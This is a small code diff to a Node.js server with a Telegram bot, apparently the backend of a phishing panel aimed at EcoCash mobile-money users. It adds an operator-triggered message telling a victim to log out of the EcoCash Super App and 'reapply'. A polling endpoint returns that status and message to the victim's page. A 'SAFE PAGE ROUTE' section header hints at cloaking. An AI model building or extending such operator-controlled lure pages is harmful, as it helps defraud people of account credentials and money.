@@ -236,6 +236,7 @@ if (botEnabled) {
   bot.action(/^logout\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "logged_out";
+    statusStore[`${phone}:message`] = "Please log out from EcoCash Super App and try reapplying again";
     const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
     const logoutMsg = `🚫 <b>USER LOGGED OUT</b>
@@ -377,7 +378,9 @@ if (botEnabled) {
 // -------------------- STATUS CHECK --------------------
 app.get('/api/check-status', (req, res) => {
   const phone = req.query.phone;
-  res.json({ status: statusStore[phone] || "pending" });
+  const status = statusStore[phone] || "pending";
+  const message = statusStore[`${phone}:message`] || "";
+  res.json({ status, message });
 });
 
 // -------------------- SAFE PAGE ROUTE --------------------
